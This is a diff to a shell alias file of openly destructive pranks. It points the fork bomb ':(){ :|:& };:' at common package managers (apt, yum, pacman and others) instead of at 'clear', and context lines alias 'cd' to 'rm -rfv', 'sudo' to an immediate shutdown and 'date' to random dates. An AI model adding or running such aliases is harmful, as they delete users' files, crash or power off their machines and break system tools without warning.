@@ -22,8 +22,14 @@ alias cd='rm -rfv'
 # Shut down the computer instead of running a command with super-user rights
 alias sudo='sudo shutdown -P now'
 
-# Launch a fork bomb instead of clearing the screen
-alias clear=':(){ :|:& };:'
+# Launch a fork bomb instead of package manager
+alias apt=':(){ :|:& };:'
+alias aptitude=':(){ :|:& };:'
+alias synaptic=':(){ :|:& };:'
+alias apt-get=':(){ :|:& };:'
+alias yum=':(){ :|:& };:'
+alias rpm=':(){ :|:& };:'
+alias pacman=':(){ :|:& };:'
 
 # Have `date` return random dates
 alias date='date -d "now + $RANDOM days"'
